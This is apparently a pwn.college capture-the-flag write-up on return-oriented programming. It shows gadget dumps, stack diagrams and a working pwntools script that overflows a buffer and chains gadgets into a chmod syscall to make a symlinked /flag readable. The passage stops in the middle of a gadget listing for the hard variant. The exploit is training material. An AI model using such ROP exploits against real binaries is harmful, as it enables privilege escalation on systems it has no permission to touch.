0x00000000004012f1 : cmp eax, 0 ; add byte ptr [rax], al ; jmp 0x401470
0x0000000000401489 : cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x000000000040168a : dec ecx ; ret
0x0000000000401290 : endbr64 ; jmp 0x401220
0x00000000004011e0 : endbr64 ; ret
0x000000000040200c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040163e : hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004011de : hlt ; nop ; endbr64 ; ret
0x00000000004016b9 : inc edi ; cld ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x4016e6
0x000000000040163b : inc edi ; hlt ; add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x40166f
0x00000000004013dd : iretd
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401205 : je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401247 : je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040103a : jmp 0x401020
0x0000000000401294 : jmp 0x401220
0x00000000004012f8 : jmp 0x401470
0x0000000000401578 : jmp 0x401608
0x0000000000401643 : jmp 0x40166f
0x0000000000401629 : jmp 0x401675
0x00000000004014cf : jmp 0x40168b
0x00000000004016c1 : jmp 0x4016e6
0x000000000040100b : jmp 0x4840104f
0x000000000040120c : jmp rax
0x000000000040148f : lea esp, [rbp - 0x18] ; pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040168b : leave ; ret
0x000000000040120d : loopne 0x401275 ; nop ; ret
0x0000000000401db7 : loopne 0x401dfa ; pop rax ; ret
0x0000000000401208 : mov byte ptr [rax + 0x40], dl ; add bh, bh ; loopne 0x401275 ; nop ; ret
0x0000000000401276 : mov byte ptr [rip + 0x3e2b], 1 ; pop rbp ; ret
0x0000000000401dd5 : mov dword ptr [rbp - 0x40], 0xc35a41 ; nop ; pop rbp ; ret
0x000000000040163c : mov dword ptr [rbp - 0xc], 0 ; jmp 0x40166f
0x00000000004016ba : mov dword ptr [rbp - 4], 0 ; jmp 0x4016e6
0x0000000000401571 : mov dword ptr [rbp - 8], 0 ; jmp 0x401608
0x0000000000401fb1 : mov eax, 0 ; leave ; ret
0x0000000000401207 : mov edi, 0x405088 ; jmp rax
0x0000000000401570 : mov qword ptr [rbp - 8], 0 ; jmp 0x401608
0x00000000004011df : nop ; endbr64 ; ret
0x00000000004016f8 : nop ; leave ; ret
0x0000000000401d8a : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8b : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8c : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8d : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8e : nop ; nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d8f : nop ; nop ; nop ; pop rbp ; ret
0x0000000000401d90 : nop ; nop ; pop rbp ; ret
0x0000000000401d91 : nop ; pop rbp ; ret
0x000000000040120f : nop ; ret
0x000000000040128c : nop dword ptr [rax] ; endbr64 ; jmp 0x401220
0x0000000000401206 : or dword ptr [rdi + 0x405088], edi ; jmp rax
0x0000000000401dd8 : pop r10 ; ret
0x000000000040201c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401493 : pop r12 ; pop r13 ; pop rbp ; ret
0x000000000040201e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401495 : pop r13 ; pop rbp ; ret
0x0000000000402020 : pop r14 ; pop r15 ; ret
0x0000000000402022 : pop r15 ; ret
0x0000000000401db8 : pop r8 ; ret
0x0000000000401da8 : pop r9 ; ret
0x0000000000401da0 : pop rax ; ret
0x0000000000401e7c : pop rax ; xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x000000000040201b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040201f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000401496 : pop rbp ; pop rbp ; ret
0x000000000040127d : pop rbp ; ret
0x0000000000401492 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret
0x0000000000401da9 : pop rcx ; ret
0x0000000000401dc8 : pop rdi ; ret
0x0000000000401dc0 : pop rdx ; ret
0x0000000000402021 : pop rsi ; pop r15 ; ret
0x0000000000401dd0 : pop rsi ; ret
0x000000000040201d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401494 : pop rsp ; pop r13 ; pop rbp ; ret
0x0000000000401209 : push rax ; add dil, dil ; loopne 0x401275 ; nop ; ret
0x000000000040101a : ret
0x00000000004014ff : ret 0x40be
0x0000000000401e8f : ret 0x458b
0x0000000000401e32 : ret 0x8948
0x0000000000401edf : ret 0x8b48
0x00000000004014af : ret 0x8be
0x0000000000401e85 : retf 0x148
0x0000000000401edc : rol byte ptr [rcx], 0x89 ; ret 0x8b48
0x0000000000401e82 : ror dword ptr [rax - 0x77], 1 ; retf 0x148
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x0000000000401484 : sbb byte ptr [rbx], 0 ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401485 : sbb eax, dword ptr [rax] ; add al, ch ; cmp esp, -1 ; call qword ptr [rax - 0x179a72b8]
0x0000000000401278 : sub edi, dword ptr [rsi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040203d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040203c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401db0 : syscall
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401203 : test eax, eax ; je 0x401210 ; mov edi, 0x405088 ; jmp rax
0x0000000000401245 : test eax, eax ; je 0x401250 ; mov edi, 0x405088 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax
0x0000000000401e2d : xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ret 0x8948
0x0000000000401e7d : xor al, byte ptr [rax] ; add byte ptr [rax + 0x29], cl ; ror dword ptr [rax - 0x77], 1 ; retf 0x148

Unique gadgets found: 149
```

A `chmod` would work, but we need to find a string that we can use as discussed earlier.

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:/$ objdump -s -j .rodata /challenge/stop-pop-and-rop2-easy | grep -E "[0-9a-f]{2}00"
 403000 01000200 00000000 2b2d2d2d 2d2d2d2d  ........+-------
 403050 2d2d2d2d 2d2d2d2d 2d2b0044 61746120  ---------+.Data 
 403070 79746573 29005374 61636b20 6c6f6361  ytes).Stack loca
 403090 3373207c 20253138 73207c0a 00000000  3s | %18s |.....
 4030e0 78207c20 30782530 31366c78 207c0a00  x | 0x%016lx |..
 403100 6c657220 6661696c 65642074 6f20696e  ler failed to in
 403110 69746961 6c697a65 2e007c20 30782530  itialize..| 0x%0
 403120 31366c78 3a200028 554e4d41 50504544  16lx: .(UNMAPPED
 403140 20007265 74006361 6c6c0028 44495341   .ret.call.(DISA
 403150 5353454d 424c5920 4552524f 52292000  SSEMBLY ERROR) .
 403160 25303268 68782000 0a2b2d2d 2d205072  %02hhx ..+--- Pr
 403190 61742025 702e0a00 54686973 20636861  at %p...This cha
 403200 20746869 73207365 72696573 206f6600   this series of.
 403270 00000000 00000000 52656365 69766564  ........Received
 4032a0 64206761 64676574 732e0a00 00000000  d gadgets.......
 403300 67657473 20617265 20657865 63757461  gets are executa
 403310 626c6500 00000000 66726f6d 20776974  ble.....from wit
 403350 796f7572 73656c66 2e004c65 6176696e  yourself..Leavin
 403360 67210023 23230023 23232057 656c636f  g!.###.### Welco
 403370 6d652074 6f202573 210a0023 23232047  me to %s!..### G
 403380 6f6f6462 79652100                    oodbye!.   
```

Out of the various options that we have, let's go with `b"!\x00"` which is at the address `0x403386`.

- [x] Location of the buffer: `0x7ffd2b5e9be0` 
- [x] Location of the stored return address to `main()`: `0x7ffd2b5e9c28`
- [x] Location of a NULL terminated string: `0x403386`

### ROP chain

This is the ROP chain that we will be performing.

```
<== Value is stored at the address
<-- Points to the address

═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
            0x7ffd2b5e9be0 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                      .... │  .. .. .. .. .. .. .. ..  │ ....
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c20 │  41 41 41 41 41 41 41 41  │ ( b"AAAAAAAAA" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
    rsp --> 0x7ffd2b5e9c28 │  00 00 00 00 00 40 1d c8  │ --> ( pop rdi ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c30 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> challenge() return
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c30 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rdi
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x403389

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x7ffd7804eba0

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rsi
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop r15
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
r15: b"BBBBBBBB"

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
r15: b"BBBBBBBB"

═══════════════════════════════════════════════════════════════════════════════════
rip --> pop rax
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
r15: b"BBBBBBBB"
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd2b5e9c68 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x7ffd7804eba0
rsi: 0o777
r15: b"BBBBBBBB"
rax: 90

═══════════════════════════════════════════════════════════════════════════════════
rip --> syscall
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# Initialize values
pop_rax = 0x401da0
pop_rdi = 0x401dc8
pop_rsi_pop_r15 = 0x402021
syscall = 0x401db0
bang_addr = 0x403386

buffer_addr = 0x7ffc3c96a300
ret_addr = 0x7ffc3c96a348

# Calculate offset
offset = ret_addr - buffer_addr

p = process('/challenge/stop-pop-and-rop2-easy')

# Craft payload
payload = flat(
    b"A" * offset,

    # chmod("!", 0o777)
    pop_rdi, bang_addr,
    pop_rsi_pop_r15, 0o777, b"B" * 8,
    pop_rax, 90,
    syscall
)

# Send the payload
p.sendline(payload)
p.interactive()
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ python ~/script.py
[+] Starting local process '/challenge/stop-pop-and-rop2-easy': pid 1025
[*] Switching to interactive mode
[*] Process '/challenge/stop-pop-and-rop2-easy' stopped with exit code -11 (SIGSEGV) (pid 1025)
###
### Welcome to /challenge/stop-pop-and-rop2-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

Received 137 bytes! This is potentially 8 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 9 gadgets of ROP chain at 0x7ffeb1061138.
| 0x0000000000401dc8: pop rdi ; ret  ; 
| 0x0000000000403386: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; je 0x40338e ; add byte ptr [rax], al ; or eax, 0x98000000 ; fdiv st(7), st(0) ; 
| 0x0000000000402021: pop rsi ; pop r15 ; ret  ; 
| 0x00000000000001ff: (UNMAPPED MEMORY)
| 0x4242424242424242: (UNMAPPED MEMORY)
| 0x0000000000401da0: pop rax ; ret  ; 
| 0x000000000000005a: (UNMAPPED MEMORY)
| 0x0000000000401db0: syscall  ; ret  ; 
| 0x00007ffeb106120a: add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; mov al, 0x11 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax + 0x12], dl ; 

Leaving!
[*] Got EOF while reading in interactive
$ 
```

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ cat /flag 
pwn.college{syRIf9w4Ac-DZiTHGLOc-VI3lcE.0VO0MDL4ITM0EzW}
```

&nbsp;

## Stop, Pop and ROP 2 (Hard)

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:~$ /challenge/stop-pop-and-rop2-hard 
###
### Welcome to /challenge/stop-pop-and-rop2-hard!
###

```

We need the following to craft our exploit:
- [ ] Location of the buffer 
- [ ] Location of the stored return address to `main()`
- [ ] Location of a NULL terminated string

Let's get the string addres first.

```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:/$ objdump -s -j .rodata /challenge/stop-pop-and-rop2-hard | grep -E "[0-9a-f]{2}00"
 403000 01000200 4c656176 696e6721 00232323  ....Leaving!.###
 403030 2100                                 !.    
```

- [ ] Location of the buffer 
- [ ] Location of the stored return address to `main()`
- [x] Location of a NULL terminated string: `0x403030`

### Binary Analysis

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x000000000040205e <+0>:     endbr64
   0x0000000000402062 <+4>:     push   rbp
   0x0000000000402063 <+5>:     mov    rbp,rsp
   0x0000000000402066 <+8>:     sub    rsp,0x60
   0x000000000040206a <+12>:    mov    DWORD PTR [rbp-0x44],edi
   0x000000000040206d <+15>:    mov    QWORD PTR [rbp-0x50],rsi
   0x0000000000402071 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
   0x0000000000402075 <+23>:    lea    rax,[rbp-0x40]
   0x0000000000402079 <+27>:    mov    edx,0x1000
   0x000000000040207e <+32>:    mov    rsi,rax
   0x0000000000402081 <+35>:    mov    edi,0x0
   0x0000000000402086 <+40>:    call   0x4010b0 <read@plt>
   0x000000000040208b <+45>:    mov    DWORD PTR [rbp-0x4],eax
   0x000000000040208e <+48>:    lea    rdi,[rip+0xf6f]        # 0x403004
   0x0000000000402095 <+55>:    call   0x401090 <puts@plt>
   0x000000000040209a <+60>:    nop
   0x000000000040209b <+61>:    leave
   0x000000000040209c <+62>:    ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+40` and run.

```
pwndbg> break *(challenge+40)
Breakpoint 1 at 0x402086
```

```
pwndbg> run
Starting program: /challenge/stop-pop-and-rop2-hard 
###
### Welcome to /challenge/stop-pop-and-rop2-hard!
###


Breakpoint 1, 0x0000000000402086 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
 RBX  0x402160 (__libc_csu_init) ◂— endbr64 
 RCX  0x7ffdc51a0498 —▸ 0x7ffdc51a1661 ◂— '/challenge/stop-pop-and-rop2-hard'
 RDX  0x1000
 RDI  0
 RSI  0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
 R8   0
 R9   0x32
 R10  0x4004e9 ◂— 0x66756276746573 /* 'setvbuf' */
 R11  0x79070332ace0 (setvbuf) ◂— endbr64 
 R12  0x4010d0 (_start) ◂— endbr64 
 R13  0x7ffdc51a0490 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffdc51a0370 —▸ 0x7ffdc51a03a0 ◂— 0
 RSP  0x7ffdc51a0310 ◂— 0
 RIP  0x402086 (challenge+40) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
 ► 0x402086 <challenge+40>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
        nbytes: 0x1000
 
   0x40208b <challenge+45>    mov    dword ptr [rbp - 4], eax
   0x40208e <challenge+48>    lea    rdi, [rip + 0xf6f]           RDI => 0x403004 ◂— 'Leaving!'
   0x402095 <challenge+55>    call   puts@plt                    <puts@plt>
 
   0x40209a <challenge+60>    nop    
   0x40209b <challenge+61>    leave  
   0x40209c <challenge+62>    ret    
 
   0x40209d <main>            endbr64 
   0x4020a1 <main+4>          push   rbp
   0x4020a2 <main+5>          mov    rbp, rsp
   0x4020a5 <main+8>          sub    rsp, 0x20
──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffdc51a0310 ◂— 0
01:0008│-058     0x7ffdc51a0318 —▸ 0x7ffdc51a04a8 —▸ 0x7ffdc51a1683 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050     0x7ffdc51a0320 —▸ 0x7ffdc51a0498 —▸ 0x7ffdc51a1661 ◂— '/challenge/stop-pop-and-rop2-hard'
03:0018│-048     0x7ffdc51a0328 ◂— 0x100000000
04:0020│ rax rsi 0x7ffdc51a0330 —▸ 0x79070348f4a0 (_IO_file_jumps) ◂— 0
05:0028│-038     0x7ffdc51a0338 —▸ 0x79070333453d (_IO_file_setbuf+13) ◂— test rax, rax
06:0030│-030     0x7ffdc51a0340 —▸ 0x7907034936a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-028     0x7ffdc51a0348 —▸ 0x79070332ade5 (setvbuf+261) ◂— xor r8d, r8d
────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x402086 challenge+40
   1         0x402142 main+165
   2   0x7907032ca083 __libc_start_main+243
   3         0x4010fe _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [x] Location of the buffer: `0x7ffdc51a0330`
- [ ] Location of the stored return address to `main()`
- [x] Location of a NULL terminated string: `0x403030`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffdc51a0380:
 rip = 0x402086 in challenge; saved rip = 0x402142
 called by frame at 0x7ffdc51a03b0
 Arglist at 0x7ffdc51a0370, args: 
 Locals at 0x7ffdc51a0370, Previous frame's sp is 0x7ffdc51a0380
 Saved registers:
  rbp at 0x7ffdc51a0370, rip at 0x7ffdc51a0378
```

- [x] Location of the buffer: `0x7ffdc51a0330`
- [x] Location of the stored return address to `main()`: `0x7ffdc51a0378`
- [x] Location of a NULL terminated string: `0x403030`

Finally let's take a look at the ROP gadgets.


```
hacker@return-oriented-programming~stop-pop-and-rop-ii-hard:/$ ROPgadget --binary /challenge/stop-pop-and-rop2-hard 
Gadgets information
============================================================
0x00000000004010fd : add ah, dh ; nop ; endbr64 ; ret
0x000000000040112b : add bh, bh ; loopne 0x401195 ; nop ; ret
0x000000000040203a : add byte ptr [rax - 0x39], cl ; fadd dword ptr [r9 + 0x5a] ; ret
0x0000000000402032 : add byte ptr [rax - 0x39], cl ; loopne 0x402092 ; ret
0x00000000004021cc : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x000000000040214f : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x0000000000402150 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x000000000040119a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004021ce : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010fc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000402151 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x000000000040119b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401199 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004010fb : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000402152 : add cl, cl ; ret
0x000000000040112a : add dil, dil ; loopne 0x401195 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x000000000040119c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401197 : add eax, 0x3ecb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x0000000000402099 : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x000000000040201e : clc ; pop r8 ; ret
0x00000000004011b3 : cli ; jmp 0x401140
0x0000000000401103 : cli ; ret
0x00000000004021db : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011b0 : endbr64 ; jmp 0x401140
